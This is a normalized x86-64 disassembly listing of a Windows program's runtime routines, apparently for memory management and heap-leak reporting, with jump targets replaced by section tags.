cmp rax [ rdx + 0x20 ]
jbe r-xdata
retn
mov rax [ rcx ]
mov rax [ rax + 0x18 ]
lea rax [ rax - 0x1 ]
mov [ r8 ] rax
sub_4036c0
push rbp
push rsi
push rbx
sub rsp 0x40
mov rbp rsp
mov rax rcx
mov rbx rdx
xor rsi rsi
mov rcx rax
mov r8d 0xa
xor edx edx
div r8
mov rdx rax
add rdx rdx
lea rdx [ rdx + rdx * 4 ]
sub rcx rdx
add esi 0x1
mov edx 0x14
sub edx esi
mov edx edx
lea rcx [ rcx + 0x30 ]
mov [ rdx + rbp + 0x2c ] cl
test rax rax
jne r-xdata
mov eax 0x14
sub eax esi
mov eax eax
lea rcx [ rax + rbp + 0x2c ]
mov rdx rbx
mov r8d esi
call sub_404ae0
mov esi esi
lea rax [ rbx + rsi ]
lea rsp [ rbp + 0x40 ]
pop rbx
pop rsi
pop rbp
retn
sub_403740
push rsi
push rbx
sub rsp 0x28
mov rbx rdx
mov esi r8d
mov rdx rbx
mov r8d esi
call sub_404ae0
mov esi esi
lea rax [ rbx + rsi ]
add rsp 0x28
pop rbx
pop rsi
retn
sub_403770
push rbx
sub rsp 0x20
mov rbx rdx
test rcx rcx
je r-xdata
mov rcx [ rw-data ]
call sub_407d80
mov rcx [ rw-data ]
mov rdx rbx
mov r8d eax
call sub_403740
mov rax [ rcx - 0x88 ]
lea rcx [ rax + 0x1 ]
mov rdx rbx
movzx r8 [ rax ]
call sub_403740
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_4037c0
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rcx
cmp rdx 0xffff
jbe r-xdata
xor rax rax
mov rax rdx
test rax 0x3
jne r-xdata
lea rax [ rbx + rbp + 0x20 ]
mov rcx rbp
neg rcx
cmp [ rax + rcx ] rdx
ja r-xdata
lea rax [ rbx + rbp + 0x38 ]
mov rcx rbp
neg rcx
mov [ rax + rcx ] 0x0
mov rcx rdx
lea rax [ rbx + rbp + 0x20 ]
mov rdx rbp
neg rdx
lea rdx [ rax + rdx ]
mov r8d 0x30
call VirtualQuery
lea rax [ rbx + rbp + 0x20 ]
mov rcx rbp
neg rcx
mov rax [ rax + rcx ]
lea rcx [ rbx + rbp + 0x38 ]
mov r8 rbp
neg r8
mov rcx [ rcx + r8 ]
lea rax [ rax + rcx ]
lea rcx [ rdx + 0x8 ]
cmp rax rcx
jae r-xdata
xor rax rax
jmp r-xdata
lea rax [ rbx + rbp + 0x40 ]
mov rcx rbp
neg rcx
cmp [ rax + rcx ] 0x1000
jne r-xdata
lea rax [ rbx + rbp + 0x38 ]
mov rcx rbp
neg rcx
cmp [ rax + rcx ] 0x8
jb r-xdata
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
lea rax [ rbx + rbp + 0x44 ]
mov rcx rbp
neg rcx
mov eax [ rax + rcx ]
test eax 0xf6
je r-xdata
lea rax [ rbx + rbp + 0x44 ]
mov rcx rbp
neg rcx
mov eax [ rax + rcx ]
test eax 0x100
je r-xdata
mov al 0x1
jmp r-xdata
sub_4038c0
push rbp
push r13
push rdi
push rsi
push rbx
sub rsp 0x20
mov rbp rsp
mov rbx rcx
mov rsi rdx
mov edi r8d
cmp edi 0x3e8
jge r-xdata
xor rax rax
mov rcx rbx
lea rdx [ rsi - 0xc8 ]
call sub_4037c0
test al al
je r-xdata
mov rcx rbx
lea rdx [ rsi - 0x78 ]
call sub_4037c0
test al al
je r-xdata
mov r13 [ rsi - 0x78 ]
cmp [ rsi - 0xc8 ] rsi
jne r-xdata
xor rax rax
jmp r-xdata
test r13 r13
je r-xdata
lea rsp [ rbp + 0x20 ]
pop rbx
pop rsi
pop rdi
pop r13
pop rbp
retn
mov al 0x1
jmp r-xdata
mov rcx rbx
mov rdx r13
call sub_4037c0
test al al
je r-xdata
mov rcx rbx
mov rdx [ r13 ]
mov r8d edi
add r8d 0x1
call sub_4038c0
test al al
jne r-xdata
sub_403950
push rbp
push rbx
sub rsp 0x58
mov rbp rsp
mov rbx [ rcx ]
mov [ rbp + 0x38 ] 0x0
mov rcx rbp
mov rdx rbx
xor r8 r8
call sub_4038c0
test al al
jne r-xdata
mov rax rbx
lea rsp [ rbp + 0x58 ]
pop rbx
pop rbp
retn
xor rbx rbx
sub_403990
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
setne al
add rsp 0x28
retn
xor rcx rcx
mov edx 0x10000
mov r8d 0x1000
mov r9d 0x4
call sub_4024f0
mov [ rw-data ] rax
xor rcx rcx
mov dl 0x1
lea r8 [ rw-data ]
call sub_4025f0
test al al
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
nop
xor rcx rcx
call sub_402510
xor rcx rcx
mov dl 0x1
lea r8 [ rw-data ]
call sub_4025f0
test al al
je r-xdata
mov ecx 0xa
call sub_402510
sub_403a30
push rbx
sub rsp 0x20
mov rbx rcx
call sub_403990
test al al
je r-xdata
xor rax rax
mov rax [ rw-data ]
cmp [ rax ] 0x1ffe
jge r-xdata
mov rax [ rw-data ]
mov rcx [ rw-data ]
movsxd rcx [ rcx ]
mov [ rax + rcx * 8 + 0x8 ] rbx
mov rax [ rw-data ]
add [ rax ] 0x1
mov al 0x1
jmp r-xdata
mov [ rw-data ] 0x0
add rsp 0x20
pop rbx
retn
sub_403a90
push rsi
push rbx
sub rsp 0x28
mov rbx rcx
xor rsi rsi
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
add rsp 0x28
pop rbx
pop rsi
retn
call sub_403990
test al al
je r-xdata
xor rax rax
mov rcx [ rw-data ]
mov ecx [ rcx ]
sub ecx 0x1
cmp eax ecx
jg r-xdata
nop
mov [ rw-data ] 0x0
add ecx 0x1
add eax 0x1
cmp eax ecx
jne r-xdata
mov rcx [ rw-data ]
movsxd rax eax
mov rdx [ rw-data ]
mov r8 [ rw-data ]
movsxd r8 [ r8 ]
mov rdx [ rdx + r8 * 8 ]
mov [ rcx + rax * 8 + 0x8 ] rdx
mov rax [ rw-data ]
sub [ rax ] 0x1
mov sil 0x1
jmp r-xdata
mov rdx [ rw-data ]
movsxd r8 eax
cmp [ rdx + r8 * 8 + 0x8 ] rbx
jne r-xdata
sub_403b30
push rbp
push r13
push rdi
push rsi
push rbx
sub rsp 0x30
mov rbp rsp
mov rbx rcx
mov rsi rdx
mov rax [ rsi ]
lea rcx [ rw-data ]
neg rcx
lea rax [ rax + rcx ]
mov ecx 0x40
xor edx edx
div rcx
lea rcx [ rbx + rbp + 0x10050 ]
mov rdx rbp
neg rdx
lea rcx [ rcx + rdx ]
mov eax eax
shl rax 0x9
lea r13 [ rcx + rax * 8 ]
mov rcx rsi
lea rdx [ rbp + 0x28 ]
lea r8 [ rbp + 0x20 ]
call sub_403670
jmp r-xdata
mov rax [ rbp + 0x28 ]
cmp rax [ rbp + 0x20 ]
jbe r-xdata
mov rax [ rbp + 0x28 ]
mov rax [ rax - 0x8 ]
test rax 0x1
jne r-xdata
lea rsp [ rbp + 0x30 ]
pop rbx
pop rsi
pop rdi
pop r13
pop rbp
retn
mov rax [ rsi ]
movzx rax [ rax + 0x2 ]
add [ rbp + 0x28 ] rax
mov rcx [ rbp + 0x28 ]
call sub_403a90
test al al
jne r-xdata
lea rax [ rbx + rbp + 0x1004f ]
mov rcx rbp
neg rcx
mov [ rax + rcx ] 0x0
xor rdi rdi
mov rcx [ rbp + 0x28 ]
call sub_403950
test rax rax
jne r-xdata
mov edi 0x3
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x8 ] 0x100
jge r-xdata
nop
cmp edi 0xff
jg r-xdata
movsxd rcx edi
add rcx rcx
cmp [ r13 + rcx * 8 ] 0x0
je r-xdata
movsxd rdi edi
add rdi rdi
lea rax [ r13 + rdi * 8 + 0x8 ]
add [ rax ] 0x1
mov rax [ rbp + 0x28 ]
mov ecx [ rax + 0xc ]
mov rax [ rbp + 0x28 ]
movzx r8d [ rax + 0x6 ]
cmp r8d 0x1
je r-xdata
xor rdi rdi
movsxd rcx edi
add rcx rcx
mov [ r13 + rcx * 8 ] rax
jmp r-xdata
add edi 0x1
cmp edi 0xff
jle r-xdata
test ecx ecx
jle r-xdata
cmp r8d 0x2
jne r-xdata
movsxd rcx edi
add rcx rcx
cmp [ r13 + rcx * 8 ] rax
je r-xdata
mov rax [ rsi ]
movzx eax [ rax + 0x2 ]
sub eax 0x18
cdq
idiv r8d
cmp eax ecx
jle r-xdata
mov r9b 0x1
cmp r8d 0x1
jne r-xdata
mov rax [ rbp + 0x28 ]
lea rdx [ rax + 0x10 ]
mov eax 0x1
cmp eax ecx
jg r-xdata
mov rax [ rbp + 0x28 ]
lea rdx [ rax + 0x10 ]
mov eax 0x1
cmp eax ecx
jg r-xdata
nop
test r9b r9b
je r-xdata
add ecx 0x1
nop
test r9b r9b
je r-xdata
add ecx 0x1
cmp [ rdx ] 0x0
jne r-xdata
xor r9 r9
jmp r-xdata
cmp [ rdx ] 0x20
jae r-xdata
cmp [ rdx ] 0x0
jne r-xdata
xor r9 r9
jmp r-xdata
cmp [ rdx ] 0x20
jae r-xdata
mov edi 0x2
jmp r-xdata
add rdx 0x2
add eax 0x1
cmp eax ecx
jne r-xdata
mov r9b 0x1
mov edi 0x1
jmp r-xdata
add rdx 0x1
add eax 0x1
cmp eax ecx
jne r-xdata
mov r9b 0x1
test r9b r9b
je r-xdata
test r9b r9b
je r-xdata
sub_403d50
push rbp
push r14
push r13
push rdi
push rsi
push rbx
mov eax 0xfa8
sub rax 0x1000
mov [ rsp + rax ] al
cmp rax 0xfffffffffffc1fa8
ja r-xdata
sub rsp 0x3e058
mov rbp rsp
lea rcx [ rbp + 0x10050 ]
mov edx 0x2e000
xor r8 r8
call sub_404d90
lea rcx [ rbp + 0x8048 ]
mov edx 0x8000
xor r8 r8
call sub_404d90
xor rax rax
mov [ rbp + 0x2c ] eax
mov [ rbp + 0x1004f ] 0x1
mov rdi [ rw-data ]
jmp r-xdata
lea rax [ rw-data ]
cmp rdi rax
jne r-xdata
mov rcx rdi
call sub_403620
mov rsi rax
test rsi rsi
je r-xdata
mov rbx [ rw-data ]
jmp r-xdata
nop
mov rdi [ rdi + 0x8 ]
mov rax [ rsi - 0x8 ]
mov rcx rax
test rcx 0x1
jne r-xdata
lea rax [ rw-data ]
cmp rbx rax
je r-xdata
mov rcx rsi
call sub_403600
mov rsi rax
test rsi rsi
jne r-xdata
mov rcx rax
test rcx 0x4
je r-xdata
cmp [ rbp + 0x1004f ] 0x0
jne r-xdata
mov eax [ rbp + 0x2c ]
cmp eax 0x1000
jl r-xdata
mov ecx [ rbp + 0x2c ]
cmp ecx 0x1000
jge r-xdata
mov rcx rbp
mov rdx rsi
call sub_403b30
jmp r-xdata
lea rsp [ rbp + 0x3e058 ]
pop rbx
pop rsi
pop rdi
pop r13
pop r14
pop rbp
retn
xor rax rax
mov [ rbp + 0x3f ] al
xor r13 r13
mov rcx [ rw-data ]
call sub_407d80
mov rcx [ rw-data ]
lea rdx [ rbp + 0x48 ]
mov r8d eax
call sub_403740
mov [ rbp + 0x30 ] rax
xor rsi rsi
lea rcx [ rbx + 0x20 ]
call sub_403a90
test al al
jne r-xdata
mov ebx eax
and ebx 0xfffffff0
sub ebx 0x8
mov rcx rsi
call sub_403a90
test al al
jne r-xdata
nop
test bl bl
jne r-xdata
mov eax esi
shl rax 0x9
lea rax [ rbp + rax * 8 + 0x10058 ]
mov ecx edi
add rcx rcx
cmp [ rax + rcx * 8 ] 0x0
jbe r-xdata
mov rbx [ rbx + 0x8 ]
mov [ rbp + 0x1004f ] 0x0
mov rax [ rbx + 0x18 ]
and rax 0xfffffffffffffff0
lea rax [ rax - 0x28 ]
mov ecx [ rbp + 0x2c ]
movsxd rcx ecx
mov [ rbp + rcx * 8 + 0x8048 ] rax
mov eax [ rbp + 0x2c ]
add eax 0x1
mov [ rbp + 0x2c ] eax
mov [ rbp + 0x1004f ] 0x0
mov eax [ rbp + 0x2c ]
movsxd rax eax
mov ebx ebx
mov [ rbp + rax * 8 + 0x8048 ] rbx
mov eax [ rbp + 0x2c ]
add eax 0x1
mov [ rbp + 0x2c ] eax
mov r13d r14d
cmp [ rw-data ] 0x0
je r-xdata
sub edi 0x1
cmp edi 0xffffffff
jne r-xdata
movzx rax [ rbp + 0x3f ]
test al al
jne r-xdata
lea rax [ rw-data ]
mov ecx esi
add rcx rcx
add rcx rcx
add rcx rcx
movzx r14d [ rax + rcx * 8 ]
sub r14d 0x8
xor rbx rbx
mov edi 0xff
nop
mov eax [ rbp + 0x2c ]
test eax eax
jle r-xdata
mov eax r14d
add eax 0x8
test eax 0xf
jne r-xdata
lea rax [ rbp + 0x7847 ]
mov rcx [ rbp + 0x30 ]
cmp rcx rax
mov [ rbp + 0x30 ] rcx
ja r-xdata
test bl bl
jne r-xdata
mov rcx [ rw-data ]
call sub_407d80
mov rcx [ rw-data ]
mov rdx [ rbp + 0x30 ]
mov r8d eax
call sub_403740
mov [ rbp + 0x30 ] rax
mov al 0x1
mov [ rbp + 0x3f ] al
mov rcx [ rw-data ]
call sub_407d80
mov rcx [ rw-data ]
mov rdx [ rbp + 0x30 ]
mov r8d eax
call sub_403740
xor rcx rcx
lea rdx [ rbp + 0x48 ]
mov r8 [ rw-data ]
mov r9d 0x2010
call MessageBoxA
movzx rax [ rbp + 0x3f ]
test al al
je r-xdata
add esi 0x1
cmp esi 0x2e
jne r-xdata
mov rax [ rbp + 0x30 ]
mov [ rax ] 0x2c
add rax 0x1
mov [ rbp + 0x30 ] rax
mov [ rax ] 0x20
add rax 0x1
mov [ rbp + 0x30 ] rax
mov rax [ rbp + 0x30 ]
mov [ rax ] 0xd
add rax 0x1
mov [ rbp + 0x30 ] rax
mov [ rax ] 0xa
add rax 0x1
mov [ rbp + 0x30 ] rax
mov ecx r13d
add ecx 0x1
mov ecx ecx
mov rdx [ rbp + 0x30 ]
call sub_4036c0
mov [ rbp + 0x30 ] rax
mov [ rax ] 0x20
add rax 0x1
mov [ rbp + 0x30 ] rax
mov [ rax ] 0x2d
add rax 0x1
mov [ rbp + 0x30 ] rax
mov [ rax ] 0x20
add rax 0x1
mov [ rbp + 0x30 ] rax
mov ecx r14d
mov rdx [ rbp + 0x30 ]
call sub_4036c0
mov [ rbp + 0x30 ] rax
mov rcx [ rw-data ]
call sub_407d80
mov rcx [ rw-data ]
mov rdx [ rbp + 0x30 ]
mov r8d eax
call sub_403740
mov [ rbp + 0x30 ] rax
mov bl 0x1
jmp r-xdata
mov rcx [ rw-data ]
call sub_407d80
mov rcx [ rw-data ]
mov rdx [ rbp + 0x30 ]
mov r8d eax
call sub_403740
mov [ rbp + 0x30 ] rax
xor rbx rbx
mov esi [ rbp + 0x2c ]
sub esi 0x1
cmp ebx esi
ja r-xdata
mov rax [ rbp + 0x30 ]
mov [ rax ] 0xd
add rax 0x1
mov [ rbp + 0x30 ] rax
mov [ rax ] 0xa
add rax 0x1
mov [ rbp + 0x30 ] rax
mov [ rax ] 0xd
add rax 0x1
mov [ rbp + 0x30 ] rax
mov [ rax ] 0xa
add rax 0x1
mov [ rbp + 0x30 ] rax
mov rcx [ rw-data ]
call sub_407d80
mov rcx [ rw-data ]
mov rdx [ rbp + 0x30 ]
mov r8d eax
call sub_403740
mov [ rbp + 0x30 ] rax
jmp r-xdata
test eax eax
je r-xdata
mov eax edi
sub eax 0x1
cmp eax 0xffffffff
je r-xdata
nop
add esi 0x1
mov rax [ rbp + 0x30 ]
mov [ rax ] 0x20
add rax 0x1
mov [ rbp + 0x30 ] rax
mov [ rax ] 0x78
add rax 0x1
mov [ rbp + 0x30 ] rax
mov [ rax ] 0x20
add rax 0x1
mov [ rbp + 0x30 ] rax
mov eax esi
shl rax 0x9
lea rax [ rbp + rax * 8 + 0x10058 ]
mov ecx edi
add rcx rcx
mov ecx [ rax + rcx * 8 ]
mov rdx [ rbp + 0x30 ]
call sub_4036c0
mov [ rbp + 0x30 ] rax
mov rcx [ rw-data ]
call sub_407d80
mov rcx [ rw-data ]
mov rdx [ rbp + 0x30 ]
mov r8d eax
call sub_403740
mov [ rbp + 0x30 ] rax
jmp r-xdata
sub eax 0x1
test eax eax
jne r-xdata
mov eax ebx
mov rcx [ rbp + rax * 8 + 0x8048 ]
mov rdx [ rbp + 0x30 ]
call sub_4036c0
mov [ rbp + 0x30 ] rax
lea rax [ rbp + 0x7847 ]
mov rcx [ rbp + 0x30 ]
cmp rcx rax
mov [ rbp + 0x30 ] rcx
ja r-xdata
mov rax [ rbp + 0x30 ]
mov [ rax ] 0x2c
add rax 0x1
mov [ rbp + 0x30 ] rax
mov [ rax ] 0x20
add rax 0x1
mov [ rbp + 0x30 ] rax
mov eax esi
shl rax 0x9
lea rax [ rbp + rax * 8 + 0x10050 ]
mov ecx edi
add rcx rcx
mov rcx [ rax + rcx * 8 ]
mov rdx [ rbp + 0x30 ]
call sub_403770
mov [ rbp + 0x30 ] rax
jmp r-xdata
add ebx 0x1
cmp ebx esi
jne r-xdata
mov rcx [ rw-data ]
call sub_407d80
mov rcx [ rw-data ]
mov rdx [ rbp + 0x30 ]
mov r8d eax
call sub_403740
mov [ rbp + 0x30 ] rax
jmp r-xdata
test ebx ebx
je r-xdata
sub_404260
xor r8 r8
xor rcx rcx
lea rax [ rw-data ]
mov edx ecx
add rdx rdx
add rdx rdx
add rdx rdx
movzx eax [ rax + rdx * 8 ]
mov r9d 0x8
xor edx edx
div r9d
mov rdx rax
mov al 0x4
imul cl
cmp r8d edx
jae r-xdata
lea rax [ rw-data ]
mov edx ecx
add rdx rdx
add rdx rdx
add rdx rdx
movzx rax [ rax + rdx * 8 ]
test ax 0xf
jne r-xdata
nop
mov r8d edx
lea r9 [ rw-data ]
mov r10d r8d
mov [ r9 + r10 ] al
add r8d 0x1
cmp r8d edx
jb r-xdata
add ecx 0x1
cmp ecx 0x2e
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
nop
retn
sub_4042e0
sub rsp 0x28
xor r8 r8
lea rax [ rw-data ]
mov ecx r8d
add rcx rcx
add rcx rcx
add rcx rcx
lea rdx [ rw-data ]
mov r9d r8d
add r9 r9
add r9 r9
add r9 r9
lea rdx [ rdx + r9 * 8 ]
mov [ rax + rcx * 8 ] rdx
lea rax [ rw-data ]
mov ecx r8d
add rcx rcx
add rcx rcx
add rcx rcx
lea rdx [ rw-data ]
mov r9d r8d
add r9 r9
add r9 r9
add r9 r9
lea rdx [ rdx + r9 * 8 ]
mov [ rax + rcx * 8 ] rdx
lea rax [ rw-data ]
mov ecx r8d
add rcx rcx
add rcx rcx
add rcx rcx
mov [ rax + rcx * 8 ] 0x0
lea rax [ rw-data ]
mov ecx r8d
add rcx rcx
add rcx rcx
add rcx rcx
mov [ rax + rcx * 8 ] 0x1
lea rax [ rw-data ]
mov ecx r8d
add rcx rcx
add rcx rcx
add rcx rcx
movzx eax [ rax + rcx * 8 ]
add eax eax
add eax eax
lea rax [ rax + rax * 2 ]
add eax 0xff
and eax 0xffffff00
add eax 0x30
cmp eax 0xb30
jae r-xdata
lea rax [ rw-data ]
mov ecx r8d
add rcx rcx
add rcx rcx
add rcx rcx
lea rdx [ sub_402680 ]
mov [ rax + rcx * 8 ] rdx
add eax 0x4d0
mov ecx 0x2000
xor edx edx
div ecx
cmp eax 0x7
jbe r-xdata
mov eax 0xb30
lea rdx [ rw-data ]
mov r9d r8d
add r9 r9
add r9 r9
add r9 r9
mov r10b 0xff
mov ecx eax
shl r10d cl
mov [ rdx + r9 * 8 ] r10b
lea rcx [ rw-data ]
mov edx r8d
add rdx rdx
add rdx rdx
add rdx rdx
shl eax 0xd
add ax 0xb30
mov [ rcx + rdx * 8 ] ax
lea rax [ rw-data ]
mov ecx r8d
add rcx rcx
add rcx rcx
add rcx rcx
movzx eax [ rax + rcx * 8 ]
shl eax 0x4
lea rax [ rax + rax * 2 ]
add eax 0xff
and eax 0xffffff00
add eax 0x30
cmp eax 0x7330
jae r-xdata
mov eax 0x7
cmp eax 0xff30
jbe r-xdata
mov eax 0x7330
sub eax 0x30
lea rcx [ rw-data ]
mov edx r8d
add rdx rdx
add rdx rdx
add rdx rdx
movzx ecx [ rcx + rdx * 8 ]
xor edx edx
div ecx
lea rcx [ rw-data ]
mov edx r8d
add rdx rdx
add rdx rdx
add rdx rdx
lea r9 [ rw-data ]
mov r10d r8d
add r10 r10
add r10 r10
add r10 r10
imul ax [ r9 + r10 * 8 ]
add ax 0xff
and ax 0xff00
add ax 0x30
mov [ rcx + rdx * 8 ] ax
add r8d 0x1
cmp r8d 0x2e
jne r-xdata
mov eax 0xff30
lea rax [ rw-data ]
mov ecx r8d
add rcx rcx
add rcx rcx
add rcx rcx
cmp [ rax + rcx * 8 ] 0x0
jne r-xdata
nop
call sub_404260
lea rax [ rw-data ]
mov [ rw-data ] rax
lea rax [ rw-data ]
mov [ rw-data ] rax
xor r8 r8
lea rax [ rw-data ]
mov ecx r8d
add rcx rcx
lea rax [ rax + rcx * 8 ]
mov [ rax ] rax
mov [ rax + 0x8 ] rax
add r8d 0x1
cmp r8d 0x400
jne r-xdata
nop
lea rax [ rw-data ]
mov [ rw-data ] rax
lea rax [ rw-data ]
mov [ rw-data ] rax
add rsp 0x28
retn
sub_404570
push rbx
sub rsp 0x20
mov rax [ rw-data ]
jmp r-xdata
lea rcx [ rw-data ]
cmp rax rcx
jne r-xdata
mov rbx [ rax + 0x8 ]
mov rcx rax
xor rdx rdx
mov r8d 0x8000
call VirtualFree
mov rax rbx
xor rcx rcx
lea rax [ rw-data ]
movsxd rdx ecx
add rdx rdx
add rdx rdx
add rdx rdx
lea r8 [ rw-data ]
movsxd r9 ecx
add r9 r9
add r9 r9
add r9 r9
lea r8 [ r8 + r9 * 8 ]
mov [ rax + rdx * 8 ] r8
lea rax [ rw-data ]
movsxd rdx ecx
add rdx rdx
add rdx rdx
add rdx rdx
lea r8 [ rw-data ]
movsxd r9 ecx
add r9 r9
add r9 r9
add r9 r9
lea r8 [ r8 + r9 * 8 ]
mov [ rax + rdx * 8 ] r8
lea rax [ rw-data ]
movsxd rdx ecx
add rdx rdx
add rdx rdx
add rdx rdx
mov [ rax + rdx * 8 ] 0x1
lea rax [ rw-data ]
movsxd rdx ecx
add rdx rdx
add rdx rdx
add rdx rdx
mov [ rax + rdx * 8 ] 0x0
add ecx 0x1
cmp ecx 0x2e
jne r-xdata
nop
lea rax [ rw-data ]
mov [ rw-data ] rax
lea rax [ rw-data ]
mov [ rw-data ] rax
xor rcx rcx
lea rax [ rw-data ]
movsxd rdx ecx
add rdx rdx
lea rax [ rax + rdx * 8 ]
mov [ rax ] rax
mov [ rax + 0x8 ] rax
add ecx 0x1
cmp ecx 0x400
jne r-xdata
nop
mov [ rw-data ] 0x0
lea rcx [ rw-data ]
mov edx 0x80
xor r8 r8
call sub_404d90
mov [ rw-data ] 0x0
mov rax [ rw-data ]
jmp r-xdata
lea rcx [ rw-data ]
cmp rax rcx
jne r-xdata
mov rbx [ rax + 0x8 ]
mov rcx rax
xor rdx rdx
mov r8d 0x8000
call VirtualFree
mov rax rbx
lea rax [ rw-data ]
mov [ rw-data ] rax
lea rax [ rw-data ]
mov [ rw-data ] rax
add rsp 0x20
pop rbx
retn
sub_404710
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
call sub_4022b0
mov [ rw-data ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
call sub_403d50
call sub_404570
add rsp 0x28
retn
mov rcx [ rw-data ]
xor rdx rdx
mov r8d 0x8000
call VirtualFree
mov [ rw-data ] 0x0
sub_404780
push rbx
sub rsp 0x20
test rcx rcx
jg r-xdata
call [ rw-data ]
mov rbx rax
test rbx rbx
jne r-xdata
xor rbx rbx
jmp r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
mov cl 0x1
call sub_404a90
sub_4047b0
push rbx
sub rsp 0x20
test rcx rcx
jne r-xdata
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
xor rbx rbx
jmp r-xdata
mov eax ebx
add rsp 0x20
pop rbx
retn
mov cl 0x2
call sub_404a90
sub_4047e0
push rsi
push rbx
sub rsp 0x28
mov rbx rcx
cmp [ rbx ] 0x0
je r-xdata
test rdx rdx
jg r-xdata
test rdx rdx
jle r-xdata
mov rcx rdx
call [ rw-data ]
mov rsi rax
test rsi rsi
jne r-xdata
xor rsi rsi
jmp r-xdata
mov rcx [ rbx ]
call [ rw-data ]
test eax eax
je r-xdata
mov rcx [ rbx ]
call [ rw-data ]
mov rsi rax
test rsi rsi
jne r-xdata
mov [ rbx ] rsi
mov cl 0x1
call sub_404a90
mov rax rsi
add rsp 0x28
pop rbx
pop rsi
retn
xor rsi rsi
mov cl 0x2
call sub_404a90
mov [ rbx ] rsi
jmp r-xdata
mov cl 0x1
call sub_404a90
sub_404860
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
call sub_40a3e0
mov ebx [ rax + 0x180 ]
cmp ebx 0x10
jl r-xdata
call sub_40a3e0
mov ecx ebx
add ecx 0x1
mov [ rax + 0x180 ] ecx
call sub_40a3e0
lea rcx [ 0x0 ]
lea rax [ rax + rcx ]
movsxd rbx ebx
lea rbx [ rbx + rbx * 2 ]
lea rax [ rax + rbx * 8 ]
mov [ rax ] 0x0
mov [ rax + 0x10 ] 0x0
mov [ rax + 0x8 ] 0x0
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
mov ecx 0xe7
lea rax [ rbp + rbp + 0x38 ]
mov rdx rbp
neg rdx
mov rdx [ rax + rdx ]
call sub_404a10
sub_4048e0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_40a3e0
lea rcx [ 0x0 ]
lea rax [ rax + rcx ]
cmp rbx rax
jb r-xdata
add rsp 0x20
pop rbx
retn
call sub_40a3e0
lea rcx [ 0x0 ]
lea rax [ rax + rcx + 0x168 ]
cmp rbx rax
ja r-xdata
call sub_40a3e0
neg rax
lea rax [ rbx + rax ]
lea rcx [ 0x0 ]
neg rcx
lea rax [ rax + rcx ]
mov ecx 0x18
xor edx edx
div rcx
mov rbx rax
call sub_40a3e0
cmp ebx [ rax + 0x180 ]
jge r-xdata
call sub_40a3e0
mov [ rax + 0x180 ] ebx
sub_4049c0
push rbx
sub rsp 0x20
call sub_40a3e0
mov rax [ rax + 0x188 ]
test rax rax
je r-xdata
xor rbx rbx
mov rbx [ rax + 0x10 ]
mov [ rax + 0x10 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
mov rcx rbx
call [ rw-data ]
jmp r-xdata
sub_404a30
push rsi
push rbx
sub rsp 0x28
mov ebx ecx
mov rsi rdx
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov ecx ebx
mov rdx rsi
call [ rw-data ]
cmp bl 0x1b
ja r-xdata
call sub_40a3e0
movzx rbx [ rax + 0x190 ]
jmp r-xdata
movzx rcx bl
mov rdx rsi
call sub_404a10
lea rax [ rw-data ]
movzx rbx bl
movzx rbx [ rax + rbx ]
sub_404ae0
cmp rcx rdx
je r-xdata
retn
cmp r8 0x8
jg r-xdata
cmp rdx rcx
jbe r-xdata
cmp r8d 0x5
jg r-xdata
lea r10 [ r8 - 0x8 ]
mov r9 [ rcx + r10 ]
lea rax [ rdx + r10 ]
mov r9 [ rcx ]
mov rax rdx
lea r10 [ r8 - 0x8 ]
lea rdx [ rdx + r10 ]
add rcx r10
sub r8d 0x6
test r8d r8d
je r-xdata
cmp r8d 0x5
je r-xdata
nop
mov [ rax ] r9
sub r8 0x8
add rcx 0x8
add rdx 0x8
jmp r-xdata
nop
mov [ rax ] r9
jmp r-xdata
sub r8 0x8
sub rcx 0x8
sub rdx 0x8
jmp r-xdata
cmp rdx rcx
jbe r-xdata
sub r8d 0x1
test r8d r8d
je r-xdata
cmp rdx rcx
jbe r-xdata
sub r8d 0x1
test r8d r8d
je r-xdata
mov r10 [ rcx ]
mov [ rdx ] r10
cmp r8 0x10
jle r-xdata
mov r10 [ rcx ]
mov [ rdx ] r10
cmp r8 0x10
jle r-xdata
mov eax [ rcx ]
mov [ rdx ] eax
movzx rax [ rcx + 0x4 ]
mov [ rdx + 0x4 ] ax
jmp r-xdata
movzx rax [ rcx + 0x4 ]
mov [ rdx + 0x4 ] ax
mov eax [ rcx ]
mov [ rdx ] eax
jmp r-xdata
cmp rdx rcx
jbe r-xdata
sub r8d 0x1
test r8d r8d
jne r-xdata
mov eax [ rcx ]
mov [ rdx ] eax
movzx rax [ rcx + 0x4 ]
mov [ rdx + 0x4 ] al
jmp r-xdata
movzx rax [ rcx + 0x4 ]
mov [ rdx + 0x4 ] al
mov eax [ rcx ]
mov [ rdx ] eax
jmp r-xdata
movzx rax [ rcx ]
mov [ rdx ] al
jmp r-xdata
sub r8d 0x1
test r8d r8d
je r-xdata
mov eax [ rcx ]
mov [ rdx ] eax
movzx rax [ rcx + 0x4 ]
mov [ rdx + 0x4 ] ax
movzx rax [ rcx + 0x6 ]
mov [ rdx + 0x6 ] al
jmp r-xdata
movzx rax [ rcx + 0x6 ]
mov [ rdx + 0x6 ] al
movzx rax [ rcx + 0x4 ]
mov [ rdx + 0x4 ] ax
mov eax [ rcx ]
mov [ rdx ] eax
jmp r-xdata
jmp r-xdata
movzx rax [ rcx ]
mov [ rdx ] ax
jmp r-xdata
sub r8d 0x1
test r8d r8d
je r-xdata
mov rax [ rcx ]
mov [ rdx ] rax
jmp r-xdata
cmp rdx rcx
jbe r-xdata
sub r8d 0x1
test r8d r8d
jne r-xdata
